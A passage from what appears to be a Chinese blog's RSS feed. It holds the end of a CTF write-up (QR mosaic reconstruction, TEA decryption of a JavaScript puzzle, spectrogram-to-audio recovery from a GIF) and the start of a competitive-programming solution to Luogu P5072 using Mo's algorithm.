class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fked =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cntt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;savecnt=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dfs&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#从马赛克块的i行j列开始&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; cntt,savecnt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cntt = cntt+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#落在哪个二维码方块上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (cntt==&lt;span class=&#34;number&#34;&gt;200000&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#保存中途结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        MatrixToImage(np.array(new_arr)).save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mid%s.bmp&amp;#x27;&lt;/span&gt;%savecnt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        savecnt = savecnt + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cntt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i&amp;gt;=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;gt;=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; fked[i][j]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fked[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nowMin , nowSol = &lt;span class=&#34;number&#34;&gt;114514191981.0&lt;/span&gt; , (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH))-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmpp =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            tmpp[x-LUR][y-LUC]=vis[x][y]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; filN &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH)):&lt;span class=&#34;comment&#34;&gt;#枚举每个马赛克块影响到的3*3=9个QR块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;][Y+j*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],LUR,LUC)&lt;span class=&#34;comment&#34;&gt;#同样是乱写的offset+2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; tmp &amp;lt; &lt;span class=&#34;number&#34;&gt;0.00000001&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nowSol = filN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    vis[x][y] = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    res_arr[x][y]=nowSol&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = nowSol&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,j)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i,j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,j)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i,j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                fked[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        vis[x][y] = tmpp[x-LUR][y-LUC]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fked[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            vis[x][y] = tmpp[x-LUR][y-LUC]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#预先扫描，把能确定的、没有多解的先填上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        succnt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; filN &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;][Y+j*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],LUR,LUC)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; tmp &amp;lt; &lt;span class=&#34;number&#34;&gt;0.00000001&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    succnt = succnt + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = filN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; succnt == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    kimeta[x][y] = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    res_arr[x][y]=nowSol&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = nowSol&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dfs(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MatrixToImage(np.array(new_arr)).save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;resu.bmp&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终效果：&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg&#34; alt=&#34;QRCode&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;minecRaft&#34;&gt;&lt;a href=&#34;#minecRaft&#34; class=&#34;headerlink&#34; title=&#34;minecRaft&#34;&gt;&lt;/a&gt;minecRaft&lt;/h2&gt;&lt;p&gt;web× reverse√&lt;br&gt;打开网页查看js，找到flag.js，在&lt;a href=&#34;http://jsnice.org/&#34;&gt;jsnice.org&lt;/a&gt;反混淆后自己手动再替换下几个迷人眼的常量，之后进行代码审计，会发现这是个TEA加密。如何发现是TEA呢？我搜了好久，后来有人告诉我只需要搜常量就行（还需要学习一个人生经验）。&lt;br&gt;我们需要找到一个字符串s，使得s.encrypt(“{那串数字密钥}”)&amp;#x3D;&amp;#x3D;&amp;#x3D; “6f……0c”&lt;br&gt;把密文切片避免转换后数字过大，在题目页面下&lt;code&gt;F12&lt;/code&gt;，进入Console里执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;window.btoa(LongToStr4(Base16ToLong(&amp;#39;6fbde674&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;819a59bf&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;a1209256&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;5b4ca2a7&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;a11dc670&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;c678681d&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;af4afb67&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;04b82f0c&amp;#39;)))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到密文dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&amp;#x2F;tKrwwvuAQ&amp;#x3D;&lt;br&gt;谷歌&lt;code&gt;TEA decryption online&lt;/code&gt;，进入&lt;a href=&#34;https://www.mefancy.com/obfuscation/encryption-generator.php&#34;&gt;https://www.mefancy.com/obfuscation/encryption-generator.php&lt;/a&gt;把上面那串数字密钥（13…）还有密文丢进去就出flag了。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p😭q&#34;&gt;&lt;a href=&#34;#p😭q&#34; class=&#34;headerlink&#34; title=&#34;p😭q&#34;&gt;&lt;/a&gt;p😭q&lt;/h2&gt;&lt;p&gt;老外大奥流泪.gif  早知道，还是原道.jpg&lt;br&gt;先把gif的帧提取出来方便处理：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import os
import sys
from PIL import Image

def extractFrames(inGif, outFolder):
    frame = Image.open(inGif)
    nframes = 0
    while frame:
        frame.save(&amp;#39;./dest/%s.png&amp;#39; % (nframes))
        nframes += 1
        try:
            frame.seek(nframes)
        except EOFError:
            break;
    return True

if __name__ == &amp;#39;__main__&amp;#39;:
    image = os.path.abspath(sys.argv[1])
    dest = os.path.join(os.path.dirname(image), &amp;quot;dest&amp;quot;)
    if not os.path.exists(dest):
        os.mkdir(dest)
    extractFrames(image, dest)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后原题给啥库就用啥库，逆回去：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from array2gif import write_gif  # version: 1.0.4
import librosa  # version: 0.8.1
import numpy as np  # version: 1.19.5
import soundfile as sf
from PIL import Image
import matplotlib.pyplot as plt

def ImageToMatrix(filename):
    im = Image.open(filename)
    height,width = im.size
    im = im.convert(&amp;#39;L&amp;#39;)
    data = im.getdata()
    data = np.matrix(data,dtype=&amp;#39;float&amp;#39;)/255.0
    new_data = np.reshape(data,(width,height))
    return new_data
np.set_printoptions(threshold=1145141919810)
num_freqs = 32
quantize = 2
min_db = -60
max_db = 30
fft_window_size = 2048
frame_step_size = 512
window_function_type = &amp;#39;hann&amp;#39;
red_pixel = [255, 0, 0]
white_pixel = [255, 255, 255]
sample_rate = 22050
lis =  [[0.0 for col in range(587)] for row in range(32)]
imgg = [[0.0 for col in range(130)] for row in range(92)]
for ii in range (0,587):
    filename = &amp;#39;./dest/%s.png&amp;#39;%ii
    print(filename)
    data = ImageToMatrix(filename)
    for i in range(0,92):
        for j in range(0,130):
            imgg[i][j]=data.tolist()[i][j]
    for xpos in range(0,32):
        for scan in range(0,92):
            if imgg[scan][xpos*4+2]&amp;lt;1.0:  
                lis[xpos][ii]=float((91-scan)-60)
                break

spectrogram =  np.array(lis)
audio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)
sf.write(&amp;#39;newnew.wav&amp;#39;, audio_signal, sample_rate) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后在Adobe Audition CC里随便处理处理，勉强能听了，开始努力听写：&lt;br&gt;&lt;code&gt;Theflagis f,l,a,g ......&lt;/code&gt;  &lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20[Ynoi2015]%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/</guid>
            <title>洛谷:P5072 [Ynoi2015]盼君勿忘</title>
            <link>http://cubicy.icu/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20[Ynoi2015]%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/</link>
            <category>分块</category>
            <category>哈希</category>
            <pubDate>Tue, 08 Oct 2019 20:13:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;https://www.luogu.org/problem/P5072&#34;&gt;https://www.luogu.org/problem/P5072&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;给定一个序列，每次查询一个区间[l,r]中所有子序列分别去重后的和mod p&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;我们考虑每个数的贡献。即该区间内含有这个数的子序列个数。用补集转化为不含这个数的子序列个数。&lt;br&gt;那么，假设这个数在[l,r]内出现了k次，则一共有2^(r-l+1) -2^(r-l+1-k)个子序列包含这个数。&lt;br&gt;本题可以离线，因此选择使用莫队，过程中维护cnt[k]表示区间内恰好出现k次的数字个数，维护sum[j]表示区间内恰好出现j次的数字之和（区间内出现次数相同的数，对于这些数，区间中包含这些数的子序列个数都相同，因此存数字之和就行）。&lt;br&gt;然而这样时间复杂度为O(询问次数*单次询问复杂度)&amp;#x3D;O(n*max(sqrt(n),n))&amp;#x3D;O(nm)，并不可行。我们发现时间瓶颈不在莫队的sqrt(n)，而是在单次查询中求解的复杂度n。&lt;br&gt;有2个套路可供使用：出现次数大于sqrt(n)的数不超过sqrt(n)个，值不为0的cnt[k]少于2*sqrt(n)个（反证易得，本质类似）。 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于第一个套路，我们分类讨论：出现次数小于等于sqrt(n)，则统计每个出现次数的数字之和；大于sqrt(n)的用哈希表(unordered_set,C++11)存下具体的数字和其出现次数。这样每次查询是sqrt(n)。  &lt;/li&gt;
&lt;li&gt;笔者使用的则是第二个套路：val[x]表示出现次数恰好为x的数字之和（同上文的sum[j]）。随着莫队l,r指针的移动，把所有可能变为非0的val[x]记下来，指针移动完毕后再对其进行筛选，把确实非0的val[x]保留，其他去除。这样计算单次答案的复杂度就等同于单次查询中莫队指针移动的平均步数：都是sqrt(n)级别。这样做不需要用到哈希表之类的，常数小了很多，甚至不需要读入优化也能轻松过。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还没完。我们发现模数是不定的，为了保证单次查询的复杂度压在sqrt(n)以内，我们还有最后一件事情要做：在sqrt(n)的时间内求出2^(r-l+1) 和所有的2^(r-l+1-k)。这里安利一个神奇的方式：每次查询只需要做一次时间复杂度为sqrt(n)的预处理就可以O(1)查询了。&lt;br&gt;假设查询区间长度为len(len&amp;#x3D;r-l+1)，我们记siz&amp;#x3D;sqrt(len)，而后计算2^0 , 2^1 , 2^2 … 2^sqrt(len)，存在数组pow1中；再计算2^sqrt(len) , 2^(2*sqrt(len)) , 2^(3*sqrt(len)) , 2^(4*sqrt(len))… , 2^(sqrt(len)*sqrt(len))，存在数组pow[2]中。以上计算都在mod p意义下进行。&lt;br&gt;这样求2的任意次方都可以O(1)出解:2^k &amp;#x3D;2^(k&amp;#x2F;siz) *2^(k%siz)&amp;#x3D;pow2[k&amp;#x2F;siz]*pow1[k%siz]（记得模p）。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 